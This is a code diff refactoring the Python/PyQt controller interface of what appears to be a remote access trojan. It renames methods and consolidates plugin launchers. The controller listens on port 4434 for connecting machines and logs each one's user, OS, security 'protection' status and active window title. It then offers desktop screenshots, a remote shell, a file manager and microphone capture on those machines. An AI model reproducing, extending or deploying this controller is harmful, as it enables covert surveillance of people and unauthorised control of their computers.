@@ -109,34 +109,34 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.connect(self.serversTable, SIGNAL('customContextMenuRequested(const QPoint&)'), self.server_right_click_menu)
 
         # Triggers
-        self.startListenButton.clicked.connect(self.startListen)
-        self.stopListenButton.clicked.connect(self.stopListen)
+        self.startListenButton.clicked.connect(self.listen_start)
+        self.stopListenButton.clicked.connect(self.listen_stop)
         self.serversTable.clicked.connect(self.update_main_menu)
 
         # Panel Triggers
-        self.updatePreviewButton.clicked.connect(self.getPreview)
+        self.updatePreviewButton.clicked.connect(self.get_desktop_preview)
         self.unlockServerButton.clicked.connect(self.unlock_server)
-        self.remoteShellButton.clicked.connect(self.runShell)
-        self.remoteExplorerButton.clicked.connect(self.runExplorer)
-        self.remoteAudioButton.clicked.connect(self.runAudio)
         self.lockServerButton.clicked.connect(self.lock_server)
         self.quitServerButton.clicked.connect(self.lock_server)
+        self.remoteShellButton.clicked.connect(self.run_shell)
+        self.remoteExplorerButton.clicked.connect(self.run_explorer)
+        self.remoteAudioButton.clicked.connect(self.run_audio)
 
         # Custom signal for update server table
         self.connect(self, SIGNAL('updateTable()'), self.updateServersTable)
         self.connect(self, SIGNAL('updatePanel()'), self.update_main_menu)
-        self.connect(self, SIGNAL('executeShell()'), self.executeShell)
-        self.connect(self, SIGNAL('executeExplorer()'), self.executeExplorer)
-        self.connect(self, SIGNAL('executeAudio()'), self.executeAudio)
+        self.connect(self, SIGNAL('executeShell()'), lambda: self.execute_plugin(plugin='shell'))
+        self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_plugin(plugin='explorer'))
+        self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_plugin(plugin='audio'))
 
     # Start Listen for Servers
-    def startListen(self):
+    def listen_start(self):
         # Initializing variables
         if not self.acceptthreadState:
             self.socks = {}
             self.streaming_socks = {}
             self.acceptthreadState = True
-            self.listenthread = Thread(target=self.listenConnections, args=(4434,))
+            self.listenthread = Thread(target=self.accept_connections, args=(4434,))
             self.listenthread.setDaemon(True)
             self.listenthread.start()
             self.statusLabel.setText('Listening')
@@ -147,7 +147,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.startListenButton.setChecked(True)
 
     # Stop Listen for Servers
-    def stopListen(self):
+    def listen_stop(self):
         if self.acceptthreadState:
             self.acceptthreadState = False
             self.serversTable.clearContents()
@@ -169,7 +169,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
     # listen for clients
     # accept connections
-    def listenConnections(self, port):
+    def accept_connections(self, port):
 
         # Initializing socket
         self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -183,7 +183,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.c.listen(128)
 
         # Start Servers Check Thread
-        servers_check_start = threading.Thread(target=self.checkServers)
+        servers_check_start = threading.Thread(target=self.check_servers)
         servers_check_start.setDaemon(True)
         servers_check_start.start()
 
@@ -210,24 +210,24 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                     self.sock.settimeout(self.timeout)
 
                     # Save connected socket
-                    socketIndex = self.address[1]
-                    self.socks[socketIndex] = {}
-                    self.socks[socketIndex]['sock'] = self.sock
-                    self.socks[socketIndex]['ip_address'] = self.address[0]
-                    self.socks[socketIndex]['socket'] = self.address[1]
-                    self.socks[socketIndex]['ostype'] = info['ostype']
-                    self.socks[socketIndex]['protection'] = info['protection']
-                    self.socks[socketIndex]['os'] = info['os']
-                    self.socks[socketIndex]['user'] = info['user']
-                    self.socks[socketIndex]['version'] = info['version']
-                    self.socks[socketIndex]['activewindowtitle'] = info['activewindowtitle']
+                    socket_index = self.address[1]
+                    self.socks[socket_index] = {}
+                    self.socks[socket_index]['sock'] = self.sock
+                    self.socks[socket_index]['ip_address'] = self.address[0]
+                    self.socks[socket_index]['socket'] = self.address[1]
+                    self.socks[socket_index]['ostype'] = info['ostype']
+                    self.socks[socket_index]['protection'] = info['protection']
+                    self.socks[socket_index]['os'] = info['os']
+                    self.socks[socket_index]['user'] = info['user']
+                    self.socks[socket_index]['version'] = info['version']
+                    self.socks[socket_index]['activewindowtitle'] = info['activewindowtitle']
 
-                    data = get(self.sock, 'startChildSocket %s' % socketIndex, 'streamingMode')
+                    get(self.sock, 'startChildSocket %s' % socket_index, 'streamingMode')
 
                 else:
                     mode, index = data.split(' ')
                     try:
-                        if self.socks.has_key(int(index)):
+                        if int(index) in self.socks:
                             i = int(index)
 
                             if mode == 'streamingMode':
@@ -247,7 +247,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                         print e
 
     # Servers Live Update
-    def checkServers(self):
+    def check_servers(self):
         while self.acceptthreadState:
             try:
                 for i, k in self.streaming_socks.iteritems():
@@ -271,23 +271,24 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
             time.sleep(1)
 
-    def getPreview(self):
-        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
-        screenDict = get(self.socks[sockind]['sock'], 'getScreen', 'screenshot')
-        try:
-            screenInfo = ast.literal_eval(screenDict)
-        except SyntaxError:
-            print screenDict
-        width = screenInfo['width']
-        height = screenInfo['height']
-        screenbits = screenInfo['screenshot']
-        previewPath = os.path.join(self.tmp, '__preview.png')
-        raw = zlib.decompress(screenbits)
-        size = (int(width), int(height))
-        im = Image.frombuffer('RGB', size, raw, 'raw', 'BGRX', 0, 1)
-        im.save(previewPath, 'PNG')
-        pixmap = QPixmap(previewPath).scaled(QSize(280, 175))
-        self.previewLabel.setPixmap(pixmap)
+    def get_desktop_preview(self):
+        server = self.current_server()
+        if server:
+            screen_dict = get(self.socks[server]['sock'], 'getScreen', 'screenshot')
+            try:
+                screen_info = ast.literal_eval(screen_dict)
+                width = screen_info['width']
+                height = screen_info['height']
+                screenbits = screen_info['screenshot']
+                path_to_preview = os.path.join(self.tmp, '__preview.png')
+                raw = zlib.decompress(screenbits)
+                size = (int(width), int(height))
+                im = Image.frombuffer('RGB', size, raw, 'raw', 'BGRX', 0, 1)
+                im.save(path_to_preview, 'PNG')
+                pixmap = QPixmap(path_to_preview).scaled(QSize(280, 175))
+                self.previewLabel.setPixmap(pixmap)
+            except SyntaxError:
+                pass
 
     # Update Servers Table from self.socks
     def updateServersTable(self):
@@ -409,10 +410,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.eMenu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_server)
 
         else:
-            self.eMenu.addAction(QIcon(os.path.join(assets, 'mshell.png')), 'Shell', self.runShell)
+            self.eMenu.addAction(QIcon(os.path.join(assets, 'mshell.png')), 'Shell', self.run_shell)
             self.eMenu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), 'File Manager',
-                                 self.runExplorer)
-            self.eMenu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Microphone', self.runAudio)
+                                 self.run_explorer)
+            self.eMenu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Microphone', self.run_audio)
 
             self.eMenu.addSeparator()
             self.eMenu.addMenu(self.optionsMenu)
@@ -460,59 +461,18 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.pluginsBank[plugin_id] = plugins[plugin].mainPopup(args)
                 self.pluginsBank[plugin_id].show()
 
-    def signalExplorer(self, sock):
-        self.current_sock = sock
-        self.emit(SIGNAL('executeExplorer()'))
+    def run_shell(self):
+        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
+        send(self.socks[sockind]['sock'], 'startChildSocket %s' % sockind, 'shellMode')
 
-    def runExplorer(self):
+    def run_explorer(self):
         server = self.current_server()
         if server:
             send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'explorerMode')
 
-    def executeExplorer(self):
-        args = {}
-        args['sock'] = self.current_sock
-        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
-        args['socket'] = self.socks[sockind]['socket']
-        args['ipAddress'] = self.socks[sockind]['ip_address']
-        tmpid = id_generator()
-        self.pluginsBank[tmpid] = mexplorer.mainPopup(args=args)
-        self.pluginsBank[tmpid].show()
-
-    def signalAudio(self, sock):
-        self.current_sock = sock
-        self.emit(SIGNAL('executeAudio()'))
-
-    def runAudio(self):
+    def run_audio(self):
         sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
         send(self.socks[sockind]['sock'], 'startChildSocket %s' % sockind, 'audioMode')
-
-    def executeAudio(self):
-        args = {}
-        args['sock'] = self.current_sock
-        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
-        args['socket'] = self.socks[sockind]['socket']
-        args['ipAddress'] = self.socks[sockind]['ip_address']
-        tmpid = id_generator()
-        self.pluginsBank[tmpid] = maudio.mainPopup(args=args)
-        self.pluginsBank[tmpid].show()
-
-    def signalShell(self, sock):
-        self.current_sock = sock
-        self.emit(SIGNAL('executeShell()'))
-
-    def runShell(self):
-        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
-        send(self.socks[sockind]['sock'], 'startChildSocket %s' % sockind, 'shellMode')
-
-    def executeShell(self):
-        args = {'sock': self.current_sock}
-        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
-        args['socket'] = self.socks[sockind]['socket']
-        args['ipAddress'] = self.socks[sockind]['ip_address']
-        tmpid = id_generator()
-        self.pluginsBank[tmpid] = mshell.mainPopup(args=args)
-        self.pluginsBank[tmpid].show()
 
     def closeEvent(self, event):
         sys.exit(1)
